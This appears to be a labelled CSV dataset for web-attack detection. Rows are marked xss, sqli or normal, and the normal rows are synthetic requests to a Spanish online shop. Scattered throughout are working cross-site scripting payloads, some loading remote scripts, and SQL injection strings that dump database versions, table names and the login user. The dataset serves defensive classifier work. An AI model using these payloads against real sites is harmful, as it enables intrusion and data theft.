payload,type
"<a href=""\x01javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
vento8eda4,normal
<IMG “””><SCRIPT>alert(“XSS”)</SCRIPT>”>,xss
48483117z,normal
miembros/editar.jsp?modo=registro&login=violette&password=entretejedora&nombre=Yuraj&apellidos=Laumann+Mancha&email=groen%40civicosdns.na&dni=78719482G&direccion=Calle+Europa+S%2FN%2C+&ciudad=Cabanillas+de+la+Sierra&cp=18128&provincia=Teruel&ntc=0890605650691584&B1=Registrar,normal
imagenes/2.gif,normal
c26ve7sar,normal
"insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)",sqli
"<a href=""\x0Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
leobaldo,normal
<script src=%(jscript)s></script>,xss
&#X03c;,xss
imagenes/3.gif,normal
publico/productos.jsp,normal
riggsbee,normal
&lt;BODY ONLOAD=alert('XSS')&gt;,xss
<IMG SRC=JaVaScRiPt:alert('XSS')>,xss
siu-kwok,normal
miembros/fotos.jsp,normal
cybolski.doumanian@cortinasartesol.bh,normal
publico/autenticar.jsp?modo=entrar&login=bijman3&pwd=enviada&remember=off&B1=Entrar,normal
"<a href=""\x02javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>,xss
miembros/imagenes/zarauz.jpg,normal
miembros/imagenes/castro.jpg,normal
kosanovic@discon.cg,normal
"<a href=""\x0Cjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
canella,normal
imagenes/2.gif,normal
"<img src=x onerror=\x11""javascript:alert(1)"">",xss
rosselot azcona,normal
3.38E+15,normal
publico/registro.jsp?modo=registro&login=wernher&password=e%2457ct918Ena&nombre=Zulaica&apellidos=Menchaca&email=lemoine5%40informatica2009.zr&dni=97531792Q&direccion=C%2F+Florida+162+1-F&ciudad=Terrateig&cp=22001&provincia=Alicante&ntc=8264568534946529&B1=Registrar,normal
miembros/editar.jsp?modo=registro&login=bockaj&password=d0l1tativ8&nombre=S%E1ia&apellidos=Cardona&email=dewey-wellhammer%40salacomplices.nz&dni=96304534S&direccion=Callejon+Pavaneras%2C+69+6%3FB&ciudad=Mod%FAbar+de+la+Emparedada&cp=16707&provincia=Navarra&ntc=3065165787609619&B1=Registrar,normal
imagenes/2.gif,normal
grimm@madrid2012.nu,normal
8000,normal
plza. felix rodriguez de la fuente 140 3a,normal
miembros/imagenes/ogono.jpg,normal
imagenes/cmenbul.gif,normal
9824,normal
miembros/index.jsp,normal
"pl. poeta badenes, 48, 11-c",normal
braham,normal
imagenes/1.gif,normal
hanzlice,normal
miembros/imagenes/zarauz.jpg,normal
andrcies,normal
publico/caracteristicas.jsp?id=1,normal
borrenes,normal
global/menum.jsp,normal
55585768n,normal
04146926a,normal
7016,normal
gabby,normal
"s&(.): select * from users where id='1' or (\.)=1 union select 1,@@VERSION -- 1'",sqli
publico/carrito.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
index.jsp,normal
publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=61&B1=A%F1adir+al+carrito,normal
23 or 1=1; --,sqli
index.jsp,normal
imagenes/logo.gif,normal
imagenes/nuestratierra.jpg,normal
rigau amer,normal
plza. almudaina s/n,normal
"<IMG SRC=x onhashchange=""alert(String.fromCharCode(88,83,83))"">",xss
publico/caracteristicas.jsp?id=1,normal
busoms redolad,normal
"<script\x20type=""text/javascript"">javascript:alert(1);</script>",xss
jefferson-kuznezov@productosgarantizados.bb,normal
imagenes/cmenbul.gif,normal
<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>,xss
publico/caracteristicas.jsp?id=1,normal
escalera,normal
publico/productos.jsp,normal
imagenes/3.gif,normal
"s,;s: select * from users where id=1 or "",;"" or 1=1 -- 1",sqli
miembros/editar.jsp?modo=registro&login=sabanaya4&password=RECo%2BvEro&nombre=Indamira&apellidos=Dom%E8nech+Mila&email=thorne-smith%40sandrasummer.fm&dni=45478096N&direccion=Pla%E7a+Pau+Picasso%2C+88%2C+&ciudad=Marchena&cp=37724&provincia=Burgos&ntc=8486012682683585&B1=Registrar,normal
publico/caracteristicas.jsp?id=2,normal
"\"";alert('XSS');//",xss
"<object type=""text/x-scriptlet"" data=""http://jsfiddle.net/XLE63/ ""></object>",xss
"<IMG SRC=""javascript:alert('XSS');"">",xss
"&lt;LINK REL=\""stylesheet\"" HREF=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;css\""&gt;",xss
imagenes/cmenbul.gif,normal
vaquer gorigoitia,normal
"<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",xss
"so)s: select * from users where id=1 or ""&)"" or 1=1 -- 1",sqli
publico/caracteristicas.jsp?id=1,normal
miembros/imagenes/castro.jpg,normal
luisn,normal
standiford@elpaisaje.bg,normal
publico/autenticar.jsp?modo=entrar&login=leonard&pwd=escasamente&remember=off&B1=Entrar,normal
ruben,normal
miembros/editar.jsp?modo=registro&login=pomeroy5&password=C5fRA98&nombre=Bonifacio&apellidos=Iranzo&email=wyle%40designworld.us&dni=88356550A&direccion=C%2F+Ca+N%27alzina%2C+80%2C+6-B&ciudad=Requena+de+Campos&cp=45110&provincia=Granada&ntc=8995996565558024&B1=Registrar,normal
publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=100&cantidad=68&B1=A%F1adir+al+carrito,normal
threader,normal
"<div/style=""width:expression(confirm(1))"">X</div> {IE7}",xss
19665853w,normal
imagenes/cmenbul.gif,normal
"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",xss
6.45E+15,normal
""" or """"-""",sqli
imagenes/3.gif,normal
miembros/imagenes/zarauz.jpg,normal
6.59E+15,normal
imagenes/3.gif,normal
8ap6l4984,normal
"calle padre payan 127,",normal
a3ui11d,normal
59760678p,normal
miembros/imagenes/ogono.jpg,normal
18011,normal
publico/pagar.jsp?modo=insertar&precio=5366&B1=Confirmar,normal
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i",sqli
miembros/imagenes/zarauz.jpg,normal
"perl -e 'print ""<IMG SRC=java\0script:alert(\""XSS\"")>"";' > out",xss
publico/pagar.jsp?modo=insertar&precio=8164&B1=Pasar+por+caja,normal
publico/autenticar.jsp?modo=entrar&login=llaguno&pwd=cabrea_r&remember=off&B1=Entrar,normal
34310,normal
miembros/imagenes/castro.jpg,normal
molledo basagaa,normal
imagenes/nuestratierra.jpg,normal
publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=36&B1=A%F1adir+al+carrito,normal
global/estilos.css,normal
"ooUEv: select * from users where id=1 <@<@ union select null,version() -- 1",sqli
<svg><script>//&NewLine;confirm(1);</script </svg>,xss
<script>var var = 1; alert(var)</script>,xss
miembros/editar.jsp?modo=registro&login=joyan&password=hojaldrista&nombre=Mathius&apellidos=Narvate&email=pupinyo%40multaspendientes.ve&dni=08466616V&direccion=Aaiun%2C+122+12%3FF&ciudad=Andosilla&cp=17800&provincia=Le%F3n&ntc=8860654392526309&B1=Registrar,normal
rajadell,normal
global/menum.jsp,normal
"<frameset onBlur frameset onBlur=""javascript:javascript:alert(1)""></frameset onBlur>",xss
$amarulencia,normal
cedric,normal
"ABC<div style=""x:exp\x5Cression(javascript:alert(1)"">DEF",xss
imagenes/2.gif,normal
<iframe// src=javaSCRIPT&colon;alert(1),xss
miembros/imagenes/ogono.jpg,normal
miembros/salir.jsp,normal
miembros/editar.jsp?modo=registro&login=abdel-az&password=berberisco&nombre=Zaqueo&apellidos=Cabada+Ferrus&email=gentry.gast%40luchalibremexicana.cat&dni=43141809L&direccion=General+Bravo%2C+189%2C+&ciudad=Collado+Mediano&cp=31281&provincia=Salamanca&ntc=2840005774765443&B1=Registrar,normal
imagenes/logo.gif,normal
"'';!--""<XSS>=&{()}",xss
que3h5a,normal
"ABC<div style=""x:\xE2\x80\x88expression(javascript:alert(1)"">DEF",xss
publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=39&cantidad=83&B1=A%F1adir+al+carrito,normal
publico/registro.jsp?modo=registro&login=morten&password=sINCr5Nica&nombre=Solano&apellidos=Mera+Alc%E1cer&email=cambre%40be%F1esmer.na&dni=99783130E&direccion=Calle+Hostieros%2C+24+&ciudad=Brihuega&cp=50700&provincia=Cuenca&ntc=3581640568970302&B1=Registrar,normal
"c/ costa verde, 100 4c",normal
"<iframe src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>",xss
global/estilos.css,normal
&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&apos;XSS&apos;))&quot;&gt;,xss
publico/carrito.jsp,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
masegosa,normal
chismear,normal
"<img\x47src=x onerror=""javascript:alert(1)"">",xss
8.62E+15,normal
"<script a="">"" SRC=""http://www.securitycompass.com/xss.js""></script>",xss
"c/ honduras, 139 7-a",normal
publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=100&cantidad=33&B1=A%F1adir+al+carrito,normal
arganza,normal
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;,xss
publico/caracteristicas.jsp?id=1,normal
28782647x,normal
2.80E+15,normal
global/estilos.css,normal
5988,normal
"so1&1: select * from users where id='1' + 1||1 union select 1,banner from v$version where rownum=1 -- 1'",sqli
publico/registro.jsp?modo=registro&login=carlina&password=9e1an906&nombre=Selene&apellidos=Orcoyen+Leal&email=gilan%40escarba.fk&dni=45757577C&direccion=Calle+Bartolome+Sierra%2C+115+7H&ciudad=Sant+Mateu+de+Bages&cp=36384&provincia=Toledo&ntc=5349288055787524&B1=Registrar,normal
s&on&: select * from users where id='1' or \<$ or 1=1 -- 1',sqli
58439631n,normal
1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>,xss
"<a href=""\x17javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
miembros/imagenes/ogono.jpg,normal
astor,normal
publico/productos.jsp,normal
"s1UE1: select * from users where id=1 or 1#""1 union select 1,version() -- 1",sqli
<iframe/%00/ src=javaSCRIPT&colon;alert(1),xss
"<style></style\x0D<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
"<a href=""\x00javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39&cantidad=0&B1=A%F1adir+al+carrito,normal
imagenes/logo.gif,normal
7.51E+15,normal
reski.kuberskaya@n340magazin.no,normal
publico/carrito.jsp,normal
monforte del cid,normal
imagenes/nuestratierra.jpg,normal
terrill,normal
3423,normal
miembros/imagenes/ogono.jpg,normal
miembros/index.jsp,normal
publico/caracteristicas.jsp?id=1,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
22120,normal
"<marquee onScroll marquee onScroll=""javascript:javascript:alert(1)""></marquee onScroll>",xss
miembros/imagenes/zarauz.jpg,normal
"&oUE1: select * from users where id=1 or \<\ union select 1,@@VERSION -- 1",sqli
abondadamente,normal
cary-whitten@magritte.pe,normal
global/creditos.jsp,normal
"<IMG SRC=""jav    ascript:javascript:alert(1);"">",xss
miembros/fotos.jsp,normal
index.jsp,normal
global/titulo.jsp,normal
rinaldi albiol,normal
salinillas de bureba,normal
"<div/onmouseover='alert(1)'> style=""x:"">",xss
miembros/fotos.jsp,normal
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i",sqli
publico/miembros.jsp,normal
index.jsp,normal
publico/registro.jsp?modo=registro&login=dorice&password=mostazal&nombre=Oziel&apellidos=Aro&email=falconi%40socimi.com.dd&dni=85804612F&direccion=Ronda+Outeiro+S%2FN%2C+6D&ciudad=Val+do+Dubra&cp=24717&provincia=Guadalajara&ntc=5963975561813500&B1=Registrar,normal
publico/caracteristicas.jsp?id=2,normal
c28a3iz8,normal
miembros/index.jsp,normal
miembros/imagenes/ogono.jpg,normal
publico/carrito.jsp,normal
"'"">><marquee><h1>XSS</h1></marquee>",xss
boykin@cienciapolicial.gr,normal
publico/registro.jsp?modo=registro&login=hoyt&password=tope4a5o&nombre=Dalmacio&apellidos=Lehmann+Cruanas&email=maria-terzon%40lingotes.com.org&dni=46208410F&direccion=Calle+Torreta+126+9C&ciudad=Sukarrieta&cp=05140&provincia=C%E1ceres&ntc=9598787825284298&B1=Registrar,normal
publico/carrito.jsp,normal
miembros/index.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
imagenes/logo.gif,normal
"calle belen 10, 8a",normal
"<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>",xss
jiinshuh,normal
3.87E+15,normal
\&quot;;alert(&apos;XSS&apos;);//,xss
50269,normal
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",xss
"</script><img/*%00/src=""worksinchrome&colon;prompt&#x28;1&#x29;""/%00*/onerror='eval(src)'>",xss
imagenes/logo.gif,normal
global/estilos.css,normal
1438,normal
publico/autenticar.jsp?modo=entrar&login=scissons3&pwd=fal%FAa&remember=off&B1=Entrar,normal
imagenes/cmenbul.gif,normal
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//,xss
48551498q,normal
miembros/imagenes/ogono.jpg,normal
imagenes/2.gif,normal
derwin,normal
miembros/salir.jsp,normal
imagenes/2.gif,normal
3.19E+15,normal
<IMG SRC=javascript:alert('XSS')>,xss
ivancevi,normal
as,sqli
"<a style=""-o-link:'javascript:javascript:alert(1)';-o-link-source:current"">X",xss
loudiadi,normal
47901295t,normal
"<![><img src=""]><img src=x onerror=javascript:alert(1)//"">",xss
sugesto,normal
miembros/imagenes/zarauz.jpg,normal
"<x style=""behavior:url(%(sct)s)"">",xss
miembros/imagenes/castro.jpg,normal
42685012w,normal
miembros/salir.jsp,normal
imagenes/logo.gif,normal
tormellas,normal
massaguer molin,normal
"<style>BODY{-moz-binding:url(""http://www.securitycompass.com/xssmoz.xml#xss"")}</style>",xss
imagenes/logo.gif,normal
publico/registro.jsp?modo=registro&login=cancela&password=es%2Bteatita&nombre=Ivana&apellidos=Pampanas+Soto&email=tomono%40esteticadayda.az&dni=98585223R&direccion=Nao+Victoria%2C+79%2C+12%3FH&ciudad=Zarzuela&cp=32633&provincia=Madrid&ntc=3891386369836978&B1=Registrar,normal
"linares, 42",normal
global/titulo.jsp,normal
miembros/fotos.jsp,normal
miembros/imagenes/castro.jpg,normal
"sUE(1: select * from users where id='1' union select (1),banner from v$version where rownum=1 -- 1'",sqli
shupe,normal
debicki@prestoesesto.hr,normal
publico/miembros.jsp,normal
"g'""></IFRAME>Hover the cursor to the LEFT of this Message</h1>&ParamHeight=250",xss
global/estilos.css,normal
miembros/imagenes/castro.jpg,normal
imagenes/2.gif,normal
"<A HREF=""http://0x42.0x0000066.0x7.0x93/"">XSS</A>",xss
miembros/salir.jsp,normal
miembros/imagenes/ogono.jpg,normal
analfabetismo,normal
"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",xss
37795,normal
to2adora,normal
publico/registro.jsp?modo=registro&login=gran25&password=TodITo&nombre=Ranen&apellidos=Galdo+Palac%EDn&email=marysia-paramor%40programaciones.com.mg&dni=75834762J&direccion=C%2F+San+Miguel%2C+111+6%3FF&ciudad=Valencia+de+Don+Juan&cp=15171&provincia=Burgos&ntc=1041858100277526&B1=Registrar,normal
miembros/index.jsp,normal
imagenes/3.gif,normal
"<LAYER SRC=""%(scriptlet)s""></LAYER>",xss
global/titulo.jsp,normal
43061609c,normal
Execute(MsgBox(chr(88)&chr(83)&chr(83)))<,xss
"<applet onerror applet onerror=""javascript:javascript:alert(1)""></applet onerror>",xss
publico/registro.jsp?modo=registro&login=young-ba&password=acachorrar&nombre=Velen&apellidos=Ostapovich+Furnari&email=lepe%40eco-pro.mobi&dni=43061609C&direccion=Calle+Fermin+Caballero%2C+103%2C+10H&ciudad=%D3lvega&cp=18339&provincia=Alicante&ntc=6718614214297094&B1=Registrar,normal
"UEv&v: select * from users where id=1 union select @&&@,version() -- 1",sqli
"o.UEv: select * from users where id=1 *\. union select null,@@VERSION -- 1",sqli
imagenes/2.gif,normal
"<script src=""data:text/plain\x2Cjavascript:alert(1)""></script>",xss
&lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;,xss
"<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script",xss
"' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --",sqli
florestano,normal
"""><s""%2b""cript>alert(document.cookie)</script>",xss
publico/productos.jsp,normal
butts@maxtienda.na,normal
publico/caracteristicas.jsp?id=2,normal
" or 0=0 #""",sqli
"<IMG SRC=""javascript:alert('XSS');"">",xss
eseyente,normal
"'';!--""<XSS>=&{()}",xss
8.88E+14,normal
publico/autenticar.jsp?modo=entrar&login=syrett&pwd=cU%E1KeRa&remember=on&B1=Entrar,normal
miembros/imagenes/castro.jpg,normal
o$ficinesca,normal
miembros/imagenes/castro.jpg,normal
litago,normal
machar,normal
"<body onbeforeunload body onbeforeunload=""javascript:javascript:alert(1)""></body onbeforeunload>",xss
caballol menocal,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
miembros/fotos.jsp,normal
miembros/index.jsp,normal
21%,sqli
miembros/index.jsp,normal
rutledge,normal
imagenes/2.gif,normal
global/estilos.css,normal
"s;o1&: select * from users where id=1 or @#"";=1 or 1=1 -- 1",sqli
4364,normal
"""/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />",xss
"<;IMG SRC="";mocha:[code]"";>;",xss
<script>+-+-1-+-+alert(1)</script>,xss
"&lt;SCRIPT \""a='&gt;'\"" SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",xss
1)&1c: select * from users where id=1 +(1) or 1=1 -- 1,sqli
a,sqli
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:javascript:alert(1);"">",xss
publico/pagar.jsp?modo=insertar&precio=2633&B1=Confirmar,normal
guadalcanal,normal
34116,normal
3.56E+15,normal
s4dsudeste,normal
imagenes/1.gif,normal
<script src=http://yoursite.com/your_files.js></script>,xss
yessica,normal
3.14E+15,normal
bo8iner4,normal
publico/carrito.jsp,normal
montamarta,normal
<IMG SRC=javascript:javascript:alert(1)>,xss
publico/pagar.jsp?modo=insertar&precio=2365&B1=Pasar+por+caja,normal
potroso,normal
17621392b,normal
index.jsp,normal
index.jsp,normal
publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=52&B1=A%F1adir+al+carrito,normal
’ or ‘1’=’1,sqli
"c/ huescar 60,",normal
index.jsp,normal
alfeo,normal
publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=39&cantidad=84&B1=A%F1adir+al+carrito,normal
strock,normal
miembros/editar.jsp?modo=registro&login=prewitt&password=ma2o4esa&nombre=Aricel&apellidos=Romaguer&email=mirel-duvitski%40pavimentosalagon.sr&dni=38449362D&direccion=Alcalde+Isidoro+Enciso%2C+100+6%3FG&ciudad=Tolox&cp=28850&provincia=C%E1diz&ntc=5111638071636143&B1=Registrar,normal
global/titulo.jsp,normal
"vo.UE: select * from users where id=1 + @<@. union select 1,version() -- 1",sqli
"campello, el",normal
cherino gebhardt,normal
calle horreo 85 10?d,normal
miembros/imagenes/zarauz.jpg,normal
6.20E+15,normal
urko,normal
thayra,normal
"<a href=""javascript\x3A:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"escultor bauls, 96,",normal
global/titulo.jsp,normal
calle laguna de pealara 171 12-e,normal
"`""'><img src=xxx:x \x22onerror=javascript:alert(1)>",xss
"s&n.o: select * from users where id='1' or $ .=1 union select 1,@@VERSION -- 1'",sqli
"<iframe src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>",xss
publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=85&cantidad=46&B1=A%F1adir+al+carrito,normal
"<% foo><x foo=""%><script>alert(123)</script>"">",xss
publico/carrito.jsp,normal
imagenes/nuestratierra.jpg,normal
22367,normal
"&lt;LAYER SRC=\""http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\""&gt;&lt;/LAYER&gt;",xss
publico/carrito.jsp,normal
miembros/fotos.jsp,normal
anamary,normal
miembros/editar.jsp?modo=registro&login=dosenbac&password=pernig%F3n&nombre=Tersilio&apellidos=Porquet+Camarillo&email=serret%40sierradealcaraz.dj&dni=02703849S&direccion=Curuxa%2C+S%2FN+10-F&ciudad=Villanueva+de+Huerva&cp=13191&provincia=Girona&ntc=0713886795207226&B1=Registrar,normal
publico/miembros.jsp,normal
noo&1: select * from users where id=1 + $+%\ or 1=1 -- 1,sqli
"<div style=""xg-p:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>",xss
"exp/*<A STYLE='no\xss:noxss(""*//*"");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'>",xss
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera},xss
imagenes/3.gif,normal
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>,xss
' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i,sqli
publico/carrito.jsp,normal
"<applet onerror applet onerror=""javascript:javascript:alert(1)""></applet onerror>",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
me93a,normal
imagenes/3.gif,normal
arabele,normal
"s;{s: select * from users where id=1 or "";{"" or 1=1 -- 1",sqli
global/titulo.jsp,normal
"s.ns: select * from users where id=1 or ""._"" or 1=1 -- 1",sqli
index.jsp,normal
publico/carrito.jsp,normal
70243797a,normal
imagenes/1.gif,normal
"don quijote 81,",normal
manganear,normal
karin,normal
imagenes/logo.gif,normal
"cami son colam 153, 3-c",normal
publico/productos.jsp,normal
&lt,xss
"<head><base href=""javascript://""></head><body><a href=""/. /,javascript:alert(1)//#"">XXX</a></body>",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
publico/productos.jsp,normal
"calle morse, 17",normal
"<a href=""\xE2\x80\xA9javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
elder@parcalia.hn,normal
"<object data=""data:text/html;base64,%(base64)s"">",xss
"<a href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click Me</a>",xss
"<script\x0Atype=""text/javascript"">javascript:alert(1);</script>",xss
mendavia,normal
"c/ montereria, 146 4d",normal
"<a href=""\x1Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<var onmouseover=""prompt(1)"">On Mouse Over</var>",xss
"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",xss
miembros/index.jsp,normal
imagenes/cmenbul.gif,normal
publico/registro.jsp?modo=registro&login=pauli&password=SOBErmejA&nombre=L%EDa&apellidos=M%E9ndez+Testua&email=beaumont%40lasmilyuna.gi&dni=35936056M&direccion=Calle+Alpens+41%2C+2%3FG&ciudad=Hinojal&cp=19310&provincia=Lleida&ntc=8789249856609623&B1=Registrar,normal
' select name from syscolumns where id = (select id from sysobjects where name = tablename')--,sqli
publico/registro.jsp?modo=registro&login=lieneman&password=carteado&nombre=Valimir&apellidos=Escat+Monistca&email=kelsey%40helicopter.com.kh&dni=38626822R&direccion=Carlos+Trivi%F1o+Moreno%2C+2%2C+&ciudad=Quintela+de+Leirado&cp=15318&provincia=Valladolid&ntc=6182859902637153&B1=Registrar,normal
global/creditos.jsp,normal
"'""></title><script>alert(1111)</script>",xss
villacastn,normal
"moneyba, 114",normal
58305784w,normal
gamal,normal
"s,o1&: select * from users where id=1 or 1#"",=1 or 1=1 -- 1",sqli
publico/productos.jsp,normal
"<body onLoad=""alert('XSS');""",xss
global/titulo.jsp,normal
sorbello8@carrillo-de-albornoz.jobs,normal
miembros/salir.jsp,normal
index.jsp,normal
07375030b,normal
"<IMG SRC=""jav ascript:alert('XSS');"">",xss
"<style><img src=""</style><img src=x onerror=alert(123)//"">",xss
chi-keun,normal
miembros/salir.jsp,normal
"""/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />",xss
global/creditos.jsp,normal
"<body onLoad body onLoad=""javascript:javascript:alert(1)""></body onLoad>",xss
"<img src\x11=x onerror=""javascript:alert(1)"">",xss
publico/autenticar.jsp?modo=entrar&login=harrell&pwd=garruler%EDa&remember=off&B1=Entrar,normal
keaton3,normal
imagenes/cmenbul.gif,normal
"exp/*<A STYLE='no\xss:noxss(""*//*"");xss:ex/*XSS*//*/*/pression(alert(""XSS""))'>",xss
1.92E+15,normal
gates,normal
"c/ montealegre s/n, 9-b",normal
"c/ santisimo cristo del amor, 186,",normal
levi@coivoco.gr,normal
imagenes/cmenbul.gif,normal
miembros/fotos.jsp,normal
miembros/index.jsp,normal
vilar elsegui,normal
imagenes/nuestratierra.jpg,normal
"<script>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://www.securitycompass.com/xss.js""></script>",xss
imagenes/nuestratierra.jpg,normal
1750,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
miembros/imagenes/castro.jpg,normal
"<FRAMESET><FRAME SRC=\""javascript:alert('XSS');\""></FRAMESET>",xss
imagenes/nuestratierra.jpg,normal
abs hosta,normal
global/creditos.jsp,normal
shanir,normal
vilafams,normal
"UE1s: select * from users where id=1 union select 1 $$,version() -- 1",sqli
publico/vaciar.jsp?B2=Vaciar+carrito,normal
miembros/salir.jsp,normal
publico/carrito.jsp,normal
index.jsp,normal
"<;DIV STYLE="";background-image: url(javascript:alert(';XSS';))"";>;",xss
&lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,xss
5631,normal
yoon,normal
tejo,normal
"c/ arc de sant ramon del call, 189, 2-e",normal
imagenes/2.gif,normal
imagenes/3.gif,normal
"<IMG SRC=""javascript:alert('XSS');"">",xss
global/titulo.jsp,normal
miembros/index.jsp,normal
<!--[if gte IE 4]><SCRIPT>document.vulnerable=true;</SCRIPT><![endif]-->,xss
publico/pagar.jsp?modo=insertar&precio=9398&B1=Pasar+por+caja,normal
